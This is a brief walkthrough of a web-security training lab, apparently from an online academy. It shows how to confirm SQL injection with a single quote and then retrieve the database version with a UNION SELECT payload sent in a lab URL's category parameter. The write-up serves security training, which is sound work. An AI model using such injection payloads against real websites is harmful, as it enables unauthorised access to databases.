# SQL injection attack, querying the database type and version on MySQL and Microsoft

1. Inject the single quote and observe the error
2. Send the following request to solve the lab

```
https://0aa7004f049936f2809912190074007f.web-security-academy.net/filter?category=Pets'+UNION+SELECT+null,version()--+-
```

